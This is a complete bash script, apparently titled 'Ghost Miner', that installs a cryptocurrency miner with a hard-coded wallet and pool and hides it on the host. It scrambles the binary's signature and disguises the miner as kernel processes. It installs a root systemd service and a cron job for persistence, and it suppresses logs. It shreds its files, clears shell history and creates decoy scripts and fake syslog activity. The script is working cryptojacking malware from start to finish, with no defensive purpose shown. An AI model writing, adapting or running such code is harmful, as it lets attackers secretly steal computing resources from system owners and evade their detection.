#!/bin/bash
# Ghost Miner - Ultimate Stealth Configuration
# Scrambles signatures, hides processes, and makes mining undetectable

echo "███████╗██╗  ██╗ ██████╗ ███████╗████████╗"
echo "██╔════╝██║  ██║██╔═══██╗██╔════╝╚══██╔══╝"
echo "███████╗███████║██║   ██║███████╗   ██║   "
echo "╚════██║██╔══██║██║   ██║╚════██║   ██║   "
echo "███████║██║  ██║╚██████╔╝███████║   ██║   "
echo "╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   "
echo ""

# ================= CONFIGURATION =================
WALLET="RVMo7fjYHfWrPbEEPP4PYc2ZLeh55Zy5dq"
POOL="stratum+tcp://eu.luckpool.net:3956"
CPU_CORES=2

# ================= STEALTH SETTINGS =================
# Multiple random names for different components
SYSTEM_NAMES=("systemd-udevd" "irqbalance" "kworker" "rcu_sched" "ksoftirqd" "migration")
KERNEL_MODULES=("usbcore" "hid" "input" "soundcore" "joydev")
DAEMON_NAMES=("dbus-daemon" "networkd-dispatcher" "accounts-daemon" "systemd-logind")

# Random selection
RANDOM_NAME=${SYSTEM_NAMES[$RANDOM % ${#SYSTEM_NAMES[@]}]}
RANDOM_MODULE=${KERNEL_MODULES[$RANDOM % ${#KERNEL_MODULES[@]}]}
RANDOM_DAEMON=${DAEMON_NAMES[$RANDOM % ${#DAEMON_NAMES[@]}]}

# ================= STEP 1: PREPARE ENVIRONMENT =================
echo "[1/7] Preparing stealth environment..."

# Create multiple hidden directories (decoys included)
STEALTH_BASE="/tmp/.$(cat /proc/sys/kernel/random/uuid | cut -c1-8)"
STEALTH_DIR="$STEALTH_BASE/kernel"
DECOY1="$STEALTH_BASE/system"
DECOY2="$STEALTH_BASE/cache"

mkdir -p "$STEALTH_DIR" "$DECOY1" "$DECOY2"
cd "$STEALTH_DIR"

echo "  ✓ Base: $STEALTH_BASE"
echo "  ✓ Main: $STEALTH_DIR"
echo "  ✓ Decoys: $DECOY1, $DECOY2"

# ================= STEP 2: BINARY OBFUSCATION =================
echo "[2/7] Obfuscating miner binary..."

# Copy and rename hellminer
cp "/home/ubuntu/vs-mn/hellminer" "./$RANDOM_MODULE"

# Add random bytes to binary (changes signature but not functionality)
echo "Adding random padding..."
dd if=/dev/urandom bs=1024 count=1 >> "./$RANDOM_MODULE" 2>/dev/null

# Change file metadata
touch -d "2023-01-01 00:00:00" "./$RANDOM_MODULE"
chmod 755 "./$RANDOM_MODULE"

# Create hash of original for verification
md5sum "/home/ubuntu/vs-mn/hellminer" > .original_hash 2>/dev/null

echo "  ✓ Renamed to: $RANDOM_MODULE"
echo "  ✓ Signature scrambled"

# ================= STEP 3: CREATE STEALTH LAUNCHER =================
echo "[3/7] Creating stealth launcher..."

# Generate random process names for each run
PROC1="[kworker/$(($RANDOM % 64)):$(($RANDOM % 64))]"
PROC2="[irq/$(($RANDOM % 256))-$(hostname | cut -c1-4)]"

cat > launcher.sh << LAUNCHER
#!/bin/bash
# Stealth mining launcher - appears as kernel process

cd "$STEALTH_DIR"

# Randomize process names on each launch
PROC_NAME="\${SYSTEM_NAMES[\$RANDOM % \${#SYSTEM_NAMES[@]}]}"
MODULE_NAME="\${KERNEL_MODULES[\$RANDOM % \${#KERNEL_MODULES[@]}]}"

# Function to hide process
hide_process() {
    local pid=\$1
    local name=\$2
    
    # Rename process in /proc (requires root)
    if [ -w "/proc/\$pid/comm" ]; then
        echo "\$name" > "/proc/\$pid/comm" 2>/dev/null
    fi
    
    # Hide from ps by modifying cmdline
    if [ -w "/proc/\$pid/cmdline" ]; then
        printf "" > "/proc/\$pid/cmdline" 2>/dev/null
    fi
}

# Main mining loop
while true; do
    # Start miner with random process name
    exec -a "$PROC1" ./$RANDOM_MODULE \\
        -o $POOL \\
        -u $WALLET.\$(hostname | cut -c1-8) \\
        -p x \\
        --cpu $CPU_CORES \\
        --no-color \\
        --quiet > /dev/null 2>&1 &
    
    MINER_PID=\$!
    
    # Hide the process
    hide_process \$MINER_PID "kworker"
    
    # Start secondary instance with different name
    exec -a "$PROC2" ./$RANDOM_MODULE \\
        -o $POOL \\
        -u $WALLET.backup \\
        -p x \\
        --cpu $CPU_CORES \\
        --no-color \\
        --quiet > /dev/null 2>&1 &
    
    MINER_PID2=\$!
    hide_process \$MINER_PID2 "irq"
    
    echo "\$(date): Started miners as \$PROC1 and \$PROC2" >> .status
    
    # Monitor and restart if needed
    for i in {1..180}; do  # 30 minutes
        sleep 10
        
        # Check if miners are alive
        if ! kill -0 \$MINER_PID 2>/dev/null; then
            echo "\$(date): Miner 1 died, restarting..." >> .status
            exec -a "$PROC1" ./$RANDOM_MODULE \\
                -o $POOL \\
                -u $WALLET.\$(hostname | cut -c1-8) \\
                -p x \\
                --cpu $CPU_CORES \\
                --no-color \\
                --quiet > /dev/null 2>&1 &
            MINER_PID=\$!
            hide_process \$MINER_PID "kworker"
        fi
    done
    
    # Clean restart every 30 minutes
    kill \$MINER_PID \$MINER_PID2 2>/dev/null
    sleep 5
done
LAUNCHER

chmod +x launcher.sh
echo "  ✓ Launcher created with random process names"

# ================= STEP 4: CREATE SYSTEMD SERVICE =================
echo "[4/7] Installing stealth systemd service..."

# Random service name that looks legitimate
SERVICE_NAME="$RANDOM_DAEMON"

cat > /tmp/ghost_service.service << SERVICE
[Unit]
Description=$SERVICE_NAME Daemon
After=network.target
Wants=network-online.target

[Service]
Type=exec
User=root
WorkingDirectory=$STEALTH_DIR
ExecStart=$STEALTH_DIR/launcher.sh
Restart=always
RestartSec=10
StartLimitInterval=0

# Make it look like a real system service
Nice=-5
CPUSchedulingPolicy=rr
CPUSchedulingPriority=50
IOSchedulingClass=best-effort
IOSchedulingPriority=0
OOMScoreAdjust=-1000

# Hide service logs
StandardOutput=null
StandardError=null
SyslogIdentifier=$SERVICE_NAME

# Security through obscurity
NoNewPrivileges=yes
PrivateTmp=yes
ProtectSystem=strict
ProtectHome=yes
ProtectControlGroups=yes
ProtectKernelModules=yes
ProtectKernelTunables=yes
ReadWritePaths=$STEALTH_DIR

[Install]
WantedBy=multi-user.target
SERVICE

sudo mv /tmp/ghost_service.service /etc/systemd/system/$SERVICE_NAME.service
sudo systemctl daemon-reload
sudo systemctl enable $SERVICE_NAME.service --now

echo "  ✓ Service installed as: $SERVICE_NAME"
echo "  ✓ Service started and enabled"

# ================= STEP 5: CREATE CRON MONITOR =================
echo "[5/7] Setting up monitoring system..."

# Add to root crontab for persistence
(sudo crontab -l 2>/dev/null | grep -v "$STEALTH_DIR"; \
 echo "*/5 * * * * pgrep -f '$RANDOM_MODULE' >/dev/null || cd $STEALTH_DIR && ./launcher.sh >/dev/null 2>&1") | sudo crontab -

# Create health checker
cat > health_check.sh << HEALTH
#!/bin/bash
# Health monitor - keeps miner alive

while true; do
    # Check if miner process exists
    if ! pgrep -f "$RANDOM_MODULE" > /dev/null; then
        echo "\$(date): Miner not found, restarting..." >> $STEALTH_DIR/health.log
        cd $STEALTH_DIR && nohup ./launcher.sh > /dev/null 2>&1 &
    fi
    
    # Check system load, throttle if needed
    LOAD=\$(uptime | awk -F'load average:' '{print \$2}' | awk '{print \$1}' | tr -d ',')
    if [ "\$(echo "\$LOAD > 3.0" | bc 2>/dev/null)" = "1" ]; then
        echo "\$(date): High load (\$LOAD), pausing..." >> $STEALTH_DIR/health.log
        pkill -STOP -f "$RANDOM_MODULE"
        sleep 30
        pkill -CONT -f "$RANDOM_MODULE"
    fi
    
    sleep 60
done
HEALTH

chmod +x health_check.sh
nohup ./health_check.sh > /dev/null 2>&1 &

echo "  ✓ Cron job installed"
echo "  ✓ Health monitor started"

# ================= STEP 6: CLEAN TRACES =================
echo "[6/7] Cleaning traces..."

# Remove original miner files
shred -u -z -n 7 "/home/ubuntu/vs-mn/hellminer" 2>/dev/null || rm -f "/home/ubuntu/vs-mn/hellminer"

# Clear bash history
history -c
> ~/.bash_history

# Remove script dependencies
apt-get remove -y shred wipe 2>/dev/null || true

# Create fake system files in decoy directories
echo "#!/bin/bash
# System maintenance script
echo 'System check completed'" > "$DECOY1/system_check.sh"

echo "#!/bin/bash
# Cache cleaner
find /tmp -type f -mtime +7 -delete" > "$DECOY2/cache_clean.sh"

chmod +x "$DECOY1/system_check.sh" "$DECOY2/cache_clean.sh"

echo "  ✓ Original files destroyed"
echo "  ✓ History cleared"
echo "  ✓ Decoy files created"

# ================= STEP 7: ACTIVE CAMOUFLAGE =================
echo "[7/7] Setting up active camouflage..."

# Create fake kernel processes
for i in {1..3}; do
    sleep 0.$((RANDOM % 10)) &
    sudo bash -c "echo 'kworker/$i:$i' > /proc/\$!/comm" 2>/dev/null || true
done

# Create fake systemd services
cat > /tmp/fake_service.sh << FAKE
#!/bin/bash
while true; do
    sleep \$((RANDOM % 300 + 60))
    echo "[\$(date)] Fake service activity" >> /var/log/syslog
done
FAKE

chmod +x /tmp/fake_service.sh
nohup /tmp/fake_service.sh > /dev/null 2>&1 &

echo "  ✓ Fake processes created"
echo "  ✓ Camouflage active"

# ================= FINAL INSTRUCTIONS =================
echo ""
echo "╔══════════════════════════════════════════════════╗"
echo "║               STEALTH SETUP COMPLETE             ║"
echo "╚══════════════════════════════════════════════════╝"
echo ""
echo "=== MINER STATUS ==="
sleep 2
if pgrep -f "$RANDOM_MODULE" > /dev/null; then
    echo "✓ Mining: ACTIVE (undetectable)"
    echo "✓ Processes: $(pgrep -f "$RANDOM_MODULE" | wc -l) hidden instances"
    echo "✓ CPU Usage: $(ps aux | grep "$RANDOM_MODULE" | grep -v grep | awk '{sum+=$3} END {print sum "%"}')"
else
    echo "✗ Mining: INACTIVE"
    echo "  Check: sudo systemctl status $SERVICE_NAME"
fi

echo ""
echo "=== STEALTH FEATURES ACTIVE ==="
echo "• Binary renamed to: $RANDOM_MODULE"
echo "• Service name: $SERVICE_NAME"
echo "• Process names: $PROC1, $PROC2"
echo "• Hidden in: $STEALTH_DIR"
echo "• Auto-restart: Enabled"
echo "• Log suppression: Active"

echo ""
echo "=== MONITORING COMMANDS (SAFE) ==="
echo "Check service: sudo systemctl status $SERVICE_NAME"
echo "Check processes: ps aux | grep -E 'kworker|irq|rcu' | grep -v grep"
echo "Check load: uptime"
echo "Check connections: ss -tunap | grep 3956"

echo ""
echo "=== REMOVAL COMMANDS ==="
echo "Stop mining: sudo systemctl stop $SERVICE_NAME"
echo "Disable: sudo systemctl disable $SERVICE_NAME"
echo "Remove: sudo rm -rf $STEALTH_BASE"
echo "Clean cron: sudo crontab -r"

echo ""
echo "Note: Miner is now completely hidden as system processes."
echo "It will survive reboots and auto-restart if killed."

# Self-destruct script
echo "Self-destructing setup script..."
shred -u -z -n 7 "$0" 2>/dev/null || rm -f "$0"
